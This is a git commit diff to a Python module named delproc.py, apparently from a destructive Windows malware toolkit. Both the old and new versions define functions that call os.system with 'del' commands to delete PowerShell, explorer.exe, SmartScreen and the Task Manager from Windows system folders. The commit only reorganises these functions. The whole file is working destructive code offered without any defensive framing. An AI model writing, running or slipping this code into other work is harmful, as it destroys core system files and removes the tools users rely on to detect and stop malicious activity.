3800ca5e5e48f6798a9e1ec99b2d6631a606a7e2
T-wcs <70718793+T-wcs@users.noreply.github.com>
2020-11-04 20:25:23 +0100

    Update delproc.py

--- modules/system/delproc.py
+++ modules/system/delproc.py
@@ -1,18 +1,21 @@
 #!/usr/bin/python
 #coding:utf-8
 import os, sys, time
-
-# Function to delete process in the directory specified
-def remove_pwsst():
-    procs = ['smartscreen.exe', 'taskmgr.exe']
-    for proc in procs:
-        cmd = "del \\windows\\system32\\%s " %(proc)
-        os.system(cmd)
+# FUNCTION TO DELETE POWERSHELL
+def pwsst():
     pwr_sh = ['powershell.exe', 'powershell_ise.exe']
     for proc in pwr_sh:
         cmd = "del \\windows\\system32\\WindowsPowerShell\\v1.0\\%s " %(proc)
         os.system(cmd)
-# Function to delete gui process on windows
-def remove_exp():
+# FUNCTION TO DELETE EXPLORER ON WINDOWS
+def exp():
     cmd = "del \\windows\\explorer.exe "
+    os.system(cmd)
+# FUNCTION TO DELETE SMARTSCREEN
+def smart():
+    cmd = "del \\Windows\\system32\\smartscreen.exe"
+    os.system(cmd)
+# FUNCTION TO DELETE THE TASK MANAGER
+def tskmgr():
+    cmd = "del \\Windows\\system32\\taskmgr.exe"
     os.system(cmd)
